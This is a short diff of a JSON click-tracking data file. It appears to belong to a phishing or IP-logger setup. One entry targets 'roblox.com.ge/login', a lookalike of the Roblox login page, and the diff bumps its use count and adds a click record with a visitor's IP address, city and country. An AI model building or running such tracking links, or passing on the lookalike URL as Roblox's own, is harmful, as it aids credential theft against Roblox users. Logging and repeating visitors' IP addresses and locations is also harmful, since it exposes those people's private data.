@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1287,
+    "useCount": 1288,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10435,6 +10435,14 @@
       },
       {
         "timestamp": 1777369064236,
+        "ip": "91.90.121.158",
+        "country": "United Kingdom",
+        "city": "Stretford",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777369209733,
         "ip": "91.90.121.158",
         "country": "United Kingdom",
         "city": "Stretford",
